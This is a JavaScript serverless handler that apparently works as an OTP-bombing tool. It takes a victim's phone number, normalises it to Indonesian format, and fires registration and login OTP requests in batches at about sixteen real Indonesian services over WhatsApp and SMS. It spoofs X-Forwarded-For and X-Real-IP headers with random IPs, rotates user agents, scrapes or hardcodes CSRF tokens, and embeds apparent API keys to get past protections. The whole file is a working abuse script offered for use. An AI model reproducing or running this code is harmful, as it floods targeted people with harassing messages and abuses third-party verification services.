import axios from 'axios';
import { randomUUID, randomInt } from 'crypto';

// --- HELPERS ---
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
];
function randomUA() { return USER_AGENTS[randomInt(0, USER_AGENTS.length - 1)]; }
function randomIP() { return `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`; }
function normalizePhone(phone) {
  let p = phone.replace(/[^0-9]/g, "");
  if (p.startsWith("0")) p = "62" + p.slice(1);
  if (!p.startsWith("62")) p = "62" + p;
  return p;
}
function generateEmail() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < 10; i++) result += chars.charAt(randomInt(0, chars.length - 1));
  return `${result}@bwmyga.com`;
}

async function getPinhomeCSRF() {
  try {
    const resp = await axios.get('https://www.pinhome.id/daftar', {
      headers: { 'User-Agent': randomUA() },
      timeout: 10000
    });
    let csrfToken = '';
    let cookieString = '';
    const cookies = resp.headers['set-cookie'] || [];
    cookies.forEach(c => {
      const parts = c.split(';');
      cookieString += parts[0] + '; ';
      if (parts[0].includes('_X7kCsrf')) csrfToken = parts[0].split('=')[1];
    });
    if (!csrfToken) {
      const match = resp.data.match(/"csrfToken":"([^"]+)"/);
      if (match) csrfToken = match[1];
    }
    if (!csrfToken) {
      csrfToken = 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
      cookieString = '_X7kCsrf=' + csrfToken + '; _ga=GA1.1.1752313616.1783394371';
    }
    return { csrfToken, cookieString };
  } catch(e) {
    return { 
      csrfToken: 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8',
      cookieString: '_X7kCsrf=v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8'
    };
  }
}

async function getOTPEndpoints(phone) {
  const p08 = "0" + phone.slice(2);
  const p62 = phone;
  const pNoCountry = phone.replace("62", "");
  const deviceId = randomUUID();
  const requestId = randomUUID();
  const email = generateEmail();
  const csrfData = await getPinhomeCSRF();
  
  return [
    { url: "https://api.maulagi.id/api/v2/auth/check", data: { credentials: p62 }, headers: { "X-ML-KEY": "B10JLPEP10" } },
    { url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" } },
    { 
      url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", 
      data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: pNoCountry }, 
      headers: { 
        "x-csrf-token": csrfData.csrfToken,
        "Cookie": csrfData.cookieString,
        "Origin": "https://www.pinhome.id",
        "Referer": "https://www.pinhome.id/daftar",
        "Content-Type": "text/plain;charset=UTF-8"
      } 
    },
    { url: "https://www.bonusbelanja.com/api/auth/registration/app", data: { phone: p62, name: "User", agreeTnc: true, agreeContact: false } },
    { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: randomUUID() }, request_via: "whatsapp" } },
    { url: "https://www.beautyhaul.com/ajax/account/send_otp", data: { method: "WhatsApp", phone: p62 } },
    { url: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", data: { nama_lengkap: "User", telepon: p08, email: `user${randomInt(1000,9999)}@mail.com` }, headers: { "Xid": String(randomInt(1000000, 9999999)), "source": "ocistok" } },
    { url: "https://api.duniagames.co.id/api/other/api/v1/content/", method: "GET", headers: { "Accept-Language": "id", "x-device": deviceId, "Ciam-Type": "FR" } },
    { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register" } },
    { url: "https://api.dokterin.id/user/v1/users/login", data: { phone: p62, tnc_accept: true, device_id: randomUUID() }, headers: { "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" } },
    { url: "https://api.paper.id/api/v1/auth/login", data: { method: "whatsapp", phone: p08 }, headers: { "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": requestId } },
    { url: "https://api.indodax.com/api/v1/otp/send", data: { email: email, flow: "register", method: "whatsapp", old_uuid: "" }, headers: { "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" } },
    { url: "https://cms.bunda.co.id/api/v1/auth/send-otp", data: { phone_number: p62, type: "auth" }, headers: { "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" } },
    { url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", data: { phone_number: p08 } },
    { url: "https://saturdays.com/api/v1/auth/otp", data: { phone: p62, type: "register" } },
    { url: "https://api.saturdays.com/v2/user/otp/request", data: { phoneNumber: p62, channel: "whatsapp" } }
  ];
}

async function sendRequest(endpoint) {
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": randomUA(),
    "X-Forwarded-For": randomIP(),
    "X-Real-IP": randomIP(),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
    "Connection": "keep-alive",
    ...(endpoint.headers || {})
  };
  try {
    const config = { headers, timeout: 15000 };
    let resp;
    if (endpoint.method === "GET") {
      resp = await axios.get(endpoint.url, config);
    } else {
      resp = await axios.post(endpoint.url, endpoint.data, config);
    }
    let responseBody = {};
    try { responseBody = resp.data; } catch(e) {}
    if ([200, 201, 202, 204].includes(resp.status)) return true;
    if (responseBody && (responseBody.success === true || responseBody.status === "success" ||
        responseBody.statusCode === 200 || responseBody.status === 202 ||
        responseBody.is_success === true ||
        responseBody.message === "OTP terkirim" || responseBody.message === "OTP sent successfully" || responseBody.message === "Success." ||
        (responseBody.data && (responseBody.data.otp === "processed" || responseBody.data.new_uuid || responseBody.data.status === 1)) ||
        responseBody.secretCode)) return true;
    return false;
  } catch(e) {
    return false;
  }
}

// --- HANDLER ESM ---
export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { phone, batch } = req.body;
  if (!phone || !batch) return res.status(400).json({ error: 'Phone and batch required' });

  const normalized = normalizePhone(phone);
  const allEndpoints = await getOTPEndpoints(normalized);

  let endpoints;
  const batchNum = parseInt(batch);
  if (batchNum === 1) endpoints = allEndpoints.slice(0, 6);
  else if (batchNum === 2) endpoints = allEndpoints.slice(6, 12);
  else if (batchNum === 3) endpoints = allEndpoints.slice(12);
  else return res.status(400).json({ error: 'Invalid batch' });

  const start = Date.now();
  const promises = endpoints.map(ep => sendRequest(ep));
  const results = await Promise.allSettled(promises);

  const success = results.filter(r => r.status === 'fulfilled' && r.value === true).length;
  const failed = results.filter(r => r.status === 'rejected' || r.value === false).length;
  const elapsed = ((Date.now() - start) / 1000).toFixed(1);

  res.status(200).json({
    phone: normalized,
    batch: batchNum,
    total: endpoints.length,
    success,
    failed,
    elapsed: `${elapsed}s`
  });
}